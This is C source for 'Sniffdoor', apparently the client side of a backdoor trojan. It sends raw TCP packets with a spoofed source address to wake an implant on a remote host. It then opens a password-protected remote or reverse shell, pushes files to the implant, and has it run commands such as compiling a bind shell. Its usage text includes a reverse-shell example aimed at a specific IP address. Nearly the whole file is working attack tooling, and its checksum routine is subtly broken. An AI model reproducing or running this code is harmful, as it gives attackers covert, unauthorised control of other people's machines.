/*
	Sniffdoor client side V 1.0
	
	by wzt	<wzt@xsec.org>

*/


#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <errno.h>
#include "socket.h"
#include "send.h"

void  usage(char *pro)
{
    fprintf(stdout,"sniffdoor client side v %2.1f	by wzt  <wzt@xsec.org>\n\n",VER);
	fprintf(stdout,"usage : %s <options> [remote_ip] [port] [command]\n\n",pro);
	fprintf(stdout,"<options>:\n");
	fprintf(stdout,"-packet <remote_ip> [port] <command>  send tcp packets to remote ip to wake up the door\n");
	fprintf(stdout,"-connect <remote ip> <port>           connect ip to get a shell\n");
	fprintf(stdout,"-listen  <port>                       listen the port to get a shell\n\n");
	fprintf(stdout,"<command>:                            eg:\n");
	fprintf(stdout,"bind:<port>                           bind:999\n");
	fprintf(stdout,"back:<remote_ip> <port>               back:61.139.106.156:999\n");
	fprintf(stdout,"file:<filename>                       file:bind.c\n");
	fprintf(stdout,"comm:<command>                        comm:\"gcc -o bind bind.c\"\n\n");
	exit(0);
}

unsigned short in_cksum(unsigned short *addr,int len)
{
	register int   sum = 0;
	register       u_short *w = addr;
	register int   nleft = len;
	u_short	       value =0;

	while( nleft > 1 ){
		sum += *w++;
		nleft -= 2;
	}
	if( nleft == 1 ){
		*(u_char *)(&value) = *(u_char *)w;
		sum += value;
	}

	sum = ( sum >> 16 ) + ( sum & 0xffff );
	sum += ( sum >> 16 );

	return value;
}

int tcpsend(char *dst_ip,int dst_port,char *data)
{
	struct iphdr       		ip;
	struct tcphdr      		tcp;
	struct psehdr      		pseuhdr;
	struct trojan_packet 	trojan;
	struct sockaddr_in 		remote;
	char					data_buf[MAXSIZE];
	int                		sock_id;
	int						data_len;
	int                		flag=1;
	int						s_len;

	if( ( sock_id = socket(AF_INET,SOCK_RAW,IPPROTO_TCP) ) < -1 ){
		perror("[-] socket");
		exit(1);
	}

	if( setsockopt(sock_id,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag))  < 0 ){
		perror("[-] setsockopt");
		exit(1);
	}

    trojan.trojan_id = htons(TROJAN_ID);
    data_len = strlen(data);
    strcpy(trojan.data,data);
	trojan.datalen = data_len;
	
    ip.h_verlen = ( 4 << 4 | sizeof(struct iphdr) / sizeof(unsigned long) );
	ip.tos = 0;
    ip.total_len = htons(PACKLEN);
    ip.frag_and_flags = 0x40;
	ip.ident = 13;
	ip.ttl =  255;
	ip.proto = IPPROTO_TCP;
	ip.sourceIP = inet_addr("12.34.56.78");
	ip.destIP = inet_addr(dst_ip);
	ip.checksum	= 0;

	tcp.th_sport = htons(22);
	tcp.th_dport = htons(dst_port);
	tcp.th_seq   = htonl(SEQ);
	tcp.th_ack   = htonl(0);
	tcp.th_lenres=  (sizeof(struct tcphdr) / 4 << 4 | 0 );
	tcp.th_flag  = 2;
	tcp.th_win   = htons(512);
	tcp.th_sum   = 0;
	tcp.th_urp   = 0;

	pseuhdr.saddr = ip.sourceIP;
	pseuhdr.daddr = ip.destIP;
	pseuhdr.reserved = 0 ;
	pseuhdr.proto = ip.proto;
	pseuhdr.len	  = htons( TCPLEN + TROJANLEN );

    memcpy(data_buf,&pseuhdr,PSELEN);
    memcpy(data_buf + PSELEN,&tcp,TCPLEN);
    memcpy(data_buf + PSELEN + TCPLEN,&trojan,TROJANLEN);
	
	tcp.th_sum = in_cksum( (unsigned short *)data_buf,( PSELEN + TCPLEN + TROJANLEN + data_len ) );
	
	memcpy(data_buf,&ip,IPLEN);
	memcpy(data_buf + IPLEN,&tcp,TCPLEN);
	memcpy(data_buf + IPLEN + TCPLEN,&trojan,TROJANLEN);

	remote.sin_family = AF_INET;
	remote.sin_port	  = tcp.th_dport;
	remote.sin_addr.s_addr = ip.destIP;

	if( (s_len = sendto( sock_id,data_buf,PACKLEN,0,(struct sockaddr *)&remote,sizeof(struct sockaddr)) )< 0 ){
		perror("[-] sendto");
		exit(1);
	}

	printf("[+] Packet Successfuly Sending %d Size.\n",s_len);

	close(sock_id);
}

void getshell_remote(int ip,int port)
{
	char	buf[MAXNAME];
    int 	sock_fd;
    
    sock_fd = connect_ip(ip,port);
    if( sock_fd < 0 ){
        printf("[-] connect ip failed.\n");
        close(sock_fd);
        exit(1);
    }

    
	write(sock_fd,PASSWD,strlen(PASSWD));
	read(sock_fd,buf,sizeof(buf));
	if ( !strcmp(buf,PASSERR)  ) {
		printf("[-] %s\n",PASSERR);
		exit(0);
	}

    shell(sock_fd);
    close(sock_fd);
}

void getshell_local(int port)
{
	char	buf[MAXNAME];
    int 	sock_fd;

    printf("[+] listen on port %d\n",ntohs(port));
    sock_fd = listen_port(port);
    
    if( sock_fd < 0 ){
        printf("[-] bind port failed.\n");
        close(sock_fd);
        exit(1);
    }
       
    write(sock_fd,PASSWD,strlen(PASSWD));
    read(sock_fd,buf,sizeof(buf));
    if ( !strcmp(buf,PASSERR)  ) {
        printf("[-] %s\n",PASSERR);
        exit(0);
    }

    shell(sock_fd);
    close(sock_fd);
}

int scan_port(int ip)
{
    int i = 0;
    int sock_fd;
    
    for( ; i < PORT_NUM ; i++ ){
        sock_fd = connect_ip(ip,htons(ports[i]));
        printf("[+] trying port %5d ...          ",ports[i]);
        if( sock_fd  ){
            printf("ok.\n");
//     		close(sock_fd);
            return ports[i];
        }
        else
            printf("failed.\n");
    }
    
    return 0;
}

/*
void get_ctrl_c()
{
	printf("\r\n[-] Received Ctrl+c!\r\n");

	closeallfd();
	exit(0);
}
*/

/* code based on contty by sd */
void sendenv(int sock)
{
    struct    winsize    ws;
    char    envbuf[ENVLEN+1];
    char    buf1[256];
    char    buf2[256];
    int    i = 0;

    ioctl(0, TIOCGWINSZ, &ws);
    sprintf(buf1, "COLUMNS=%d", ws.ws_col);
    sprintf(buf2, "LINES=%d", ws.ws_row);
    envtab[0] = buf1; envtab[1] = buf2;

    while (envtab[i]) {
        bzero(envbuf, ENVLEN);
        if (envtab[i][0] == '!') {
            char *env;
            env = getenv(&envtab[i][1]);
            if (!env) goto oops;
            sprintf(envbuf, "%s=%s", &envtab[i][1], env);
        } else {
            strncpy(envbuf, envtab[i], ENVLEN);
        }
        write(sock, envbuf, ENVLEN);
    oops:
        i++;
    }
    write(sock, "\n\n\n", 3);
}

void winch(int i)
{
    signal(SIGWINCH, winch);
    winsize++;
}

void shell(int sock)
{
    struct termios    old, new;
    unsigned char     buf[BUF];
    fd_set            fds;
    int               eerrno;
    struct winsize    ws;


    /* send enviroment */
    sendenv(sock);

    /* set-up terminal */
    tcgetattr(0, &old);
    new = old;
    new.c_lflag &= ~(ICANON | ECHO | ISIG);
    new.c_iflag &= ~(IXON | IXOFF);
    tcsetattr(0, TCSAFLUSH, &new);

    winch(0);
    while (1) {
        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(sock, &fds);

        if( winsize ) {
            if (ioctl(0, TIOCGWINSZ, &ws) == 0) {
                buf[0] = ECHAR;
                buf[1] = (ws.ws_col >> 8) & 0xFF;
                buf[2] = ws.ws_col & 0xFF;
                buf[3] = (ws.ws_row >> 8) & 0xFF;
                buf[4] = ws.ws_row & 0xFF;
                write(sock, buf, 5);
            }
            winsize = 0;
        }

        if ( select(sock+1, &fds, NULL, NULL, NULL) < 0 ) {
            if ( errno == EINTR ) continue;
            break;
        }
        if ( winsize ) continue;
        if ( FD_ISSET(0, &fds) ) {
            int    count = read(0, buf, BUF);
            int    i;
            if ( count <= 0 ) break;
            if ( memchr(buf, ECHAR, count) ) break;
            if ( write(sock, buf, count) <= 0 ) break;
        }
        if ( FD_ISSET( sock, &fds) ) {
            int    count = read(sock, buf, BUF);
            if ( count <= 0 ) break;
            if ( write(0, buf, count) <= 0 ) break;
        }
    }
    
    close(sock);
    tcsetattr(0, TCSAFLUSH, &old);
    printf("\nConnection closed.\n");
}

void send_file_raw(char *ip,int port,char *command)
{
    char    buffer[DATASIZE] = {0};
	char 	file_name[100];
	char 	*SEND_OK = "DONE";
    int     fd,n_char;
	
    tcpsend(ip,port,command);
	strcpy(file_name,command + 5 );
	if( (fd = open(file_name,O_RDONLY)) < 0 ){
	   perror("[-] open");
   	    exit(1);
   	}

    while( (n_char = read(fd,buffer,DATASIZE)) > 0 ){
   	    buffer[n_char] = 0;
       	tcpsend(ip,port,buffer);
   	}

    tcpsend(ip,port,SEND_OK);
    close(fd);
}
    	
int main(int argc,char **argv)
{
    int     port;
    
	if( argc < 3 )     usage(argv[0]);

    if( !strcmp(argv[1],"-packet") ){
        if( argc == 5 ){
            port = atoi(argv[argc - 2]);
			printf("%d\n",port);
		}
        else{
            port = scan_port(inet_addr(argv[2]));
            if( port == 0 ){
                printf("[-] you need to find a open port and then try this again.\n");
                exit(0);
            }
        }
        if( strstr(argv[argc - 1],"file:") != NULL || strstr(argv[argc - 1],"FILE:") != NULL ){
            send_file_raw(argv[2],port,argv[argc - 1]);
        }
	    else
            tcpsend(argv[2],port,argv[argc - 1]);
        printf("[+] Done.\n");
    }
    
    if( !strcmp(argv[1],"-connect") ){
        getshell_remote(inet_addr(argv[2]),htons(atoi(argv[3])));
    }

    if( !strcmp(argv[1],"-listen") ){
        getshell_local(htons(atoi(argv[2])));
    }
    
	return 0;
}
